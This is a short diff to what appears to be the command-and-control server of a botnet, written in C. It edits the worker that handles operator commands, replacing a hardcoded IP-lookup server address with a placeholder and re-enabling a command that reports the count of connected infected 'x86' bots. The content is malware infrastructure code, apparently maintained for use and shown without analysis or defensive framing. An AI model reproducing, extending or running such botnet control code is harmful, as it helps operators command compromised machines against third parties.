@@ -1194,7 +1194,7 @@ void *BotWorker(void *sock) {
                 char iplheaders[1024];
                 struct timeval timeout;
                 struct sockaddr_in sock;
-                char *iplookup_host = "41.216.182.139";//changeme
+                char *iplookup_host = "0.0.0.0";//changeme
                 timeout.tv_sec = 4;//timeout in secs
                 timeout.tv_usec = 0;
                 IPLSock = socket(AF_INET, SOCK_STREAM, 0);
@@ -1250,12 +1250,12 @@ void *BotWorker(void *sock) {
                 close(IPLSock);
             }
         }
-        /*if (strncmp(buf, "bots", 4) == 0 || strncmp(buf, "botcount", 8) == 0) {
+        if (strncmp(buf, "bots", 4) == 0 || strncmp(buf, "botcount", 8) == 0) {
             char x86[128];
 
             sprintf(x86, "\033[1;90mServers   \033[38;5;250m~>\033[1;90m %d\r\n", x86Connected());
             if (send(datafd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
-        }*/
+        }
         if (strstr(buf, "cls")) {
             if (send(datafd, x6ascii_banner_line1, strlen(x6ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
             if (send(datafd, x6ascii_banner_line2, strlen(x6ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
